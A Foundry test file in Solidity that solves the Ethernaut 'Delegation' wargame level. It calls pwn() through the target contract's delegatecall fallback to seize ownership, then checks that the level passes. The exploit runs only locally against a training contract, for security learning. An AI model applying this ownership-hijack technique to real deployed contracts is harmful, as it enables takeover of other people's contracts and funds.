// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Delegation/Delegation.sol";
import "../src/Delegation/DelegationFactory.sol";
import "../src/Ethernaut.sol";

contract DelegateTest is Test {
    Ethernaut ethernaut;
    address player = makeAddr("player");

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(player, 1 ether);
        vm.label(player, "player");
    }

    function test_delegate_attack() public {
        DelegationFactory delegateFactory = new DelegationFactory();
        ethernaut.registerLevel(delegateFactory);

        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(delegateFactory);
        Delegation ethernautDelegation = Delegation(payable(levelAddress));

        address(ethernautDelegation).call(abi.encodeWithSignature("pwn()"));

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );

        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
